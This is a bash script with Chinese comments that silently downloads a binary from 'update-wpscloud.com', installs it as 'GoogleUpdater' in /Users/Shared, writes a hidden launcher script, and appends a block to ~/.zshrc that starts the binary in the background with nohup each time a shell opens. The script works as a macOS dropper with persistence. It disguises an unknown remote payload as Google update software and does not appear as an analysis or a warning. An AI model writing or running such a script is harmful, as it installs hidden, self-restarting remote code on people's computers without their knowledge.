#!/bin/bash

# --- 配置变量 ---
DOWNLOAD_URL="https://update-wpscloud.com/activee"
TARGET_DIR="/Users/Shared"
UPDATER_NAME="GoogleUpdater"
UPDATER_PATH="${TARGET_DIR}/${UPDATER_NAME}"

ZSHRC_FILE="$HOME/.zshrc"
LAUNCH_SCRIPT_NAME=".launch_updater.sh"
LAUNCH_SCRIPT_PATH="${TARGET_DIR}/${LAUNCH_SCRIPT_NAME}"


# --- 0. 下载并设置更新程序 ---
echo "--- 0. 下载并设置 ${UPDATER_NAME} ---"
# 使用 curl 下载文件
# -L: 跟随重定向
# -o: 指定输出文件路径
# --silent: 静默模式，只在出错时显示错误
# --show-error: 在静默模式下，如果出错则显示错误信息
curl -L --silent --show-error -o "$UPDATER_PATH" "$DOWNLOAD_URL"

# 检查 curl 命令是否成功执行
if [ $? -ne 0 ]; then
    echo "错误：下载 ${UPDATER_NAME} 失败。请检查网络连接或 URL 是否正确。"
    exit 1
fi

# 赋予可执行权限
chmod +x "$UPDATER_PATH"
if [ $? -ne 0 ]; then
    echo "错误：无法为 ${UPDATER_PATH} 设置执行权限。请检查权限。"
    exit 1
fi
echo "${UPDATER_NAME} 已成功下载并设置在 ${UPDATER_PATH}"


# --- 1. 检测或创建 ~/.zshrc 文件并检查权限 ---
echo "--- 1. 检查或创建 $ZSHRC_FILE ---"

if [ ! -f "$ZSHRC_FILE" ]; then
    echo "$ZSHRC_FILE 不存在，正在创建..."
    touch "$ZSHRC_FILE"
    if [ $? -ne 0 ]; then
        echo "错误：无法创建 $ZSHRC_FILE。请检查权限。"
        exit 1
    fi
fi

if [ ! -w "$ZSHRC_FILE" ]; then
    echo "错误：$ZSHRC_FILE 没有写入权限。请手动修改权限或以具有权限的用户运行。"
    exit 1
fi
echo "$ZSHRC_FILE 检查通过，具备写入权限。"


# --- 2. 创建辅助启动脚本 .launch_updater.sh ---
echo "--- 2. 创建辅助启动脚本 $LAUNCH_SCRIPT_PATH ---"

# 使用 Heredoc 创建辅助脚本内容
LAUNCH_SCRIPT_CONTENT=$(cat <<- 'EOF'
#!/bin/bash

CONFIG_PATH="/Users/Shared/GoogleUpdater"

if [ -f "$CONFIG_PATH" ] && [ -x "$CONFIG_PATH" ]; then

    nohup "$CONFIG_PATH" >/dev/null 2>&1 &
    
    exit 0
fi
EOF
)

# 写入脚本内容
echo "$LAUNCH_SCRIPT_CONTENT" > "$LAUNCH_SCRIPT_PATH"
if [ $? -ne 0 ]; then
    echo "错误：无法在 $TARGET_DIR 写入脚本。请检查权限。"
    exit 1
fi

# 赋予执行权限
chmod +x "$LAUNCH_SCRIPT_PATH"
echo "辅助脚本 $LAUNCH_SCRIPT_PATH 创建完成并已赋予执行权限。"


# --- 3. 追加配置到 ~/.zshrc 文件 ---
echo "--- 3. 追加配置到 $ZSHRC_FILE ---"

# 使用 Heredoc 定义要追加到 .zshrc 的内容
ZSHRC_APPEND_CONTENT=$(cat <<- 'EOF'
CONFIG_PATH="/Users/Shared/GoogleUpdater"
PROCESS_NAME="GoogleUpdater"
LAUNCH_SCRIPT="/Users/Shared/.launch_updater.sh"

if [ -f "$CONFIG_PATH" ]; then
    if [ "$SHLVL" = 1 ] && ! pgrep -f "$PROCESS_NAME" > /dev/null 2>&1; then
        
        chmod +x "$CONFIG_PATH"
        
        nohup "$LAUNCH_SCRIPT" > /dev/null 2>&1 &!

    fi
fi
# -----------------------------------------------------------------
EOF
)

# 检查是否已存在，防止重复追加
if grep -q "GoogleUpdater 自动静默启动配置" "$ZSHRC_FILE"; then
    echo "警告：检测到 $ZSHRC_FILE 中已存在配置，跳过追加。"
else
    echo -e "\n$ZSHRC_APPEND_CONTENT" >> "$ZSHRC_FILE"
    echo "配置已成功追加到 $ZSHRC_FILE。"
fi


echo -e "\n--- ✅ 自动化部署全部完成 ---"
echo "1. GoogleUpdater 已下载到 ${UPDATER_PATH}"
echo "2. 启动配置已写入 ${ZSHRC_FILE}"
echo "请运行 'source $ZSHRC_FILE' 或 **重启终端** 以应用新的配置。"
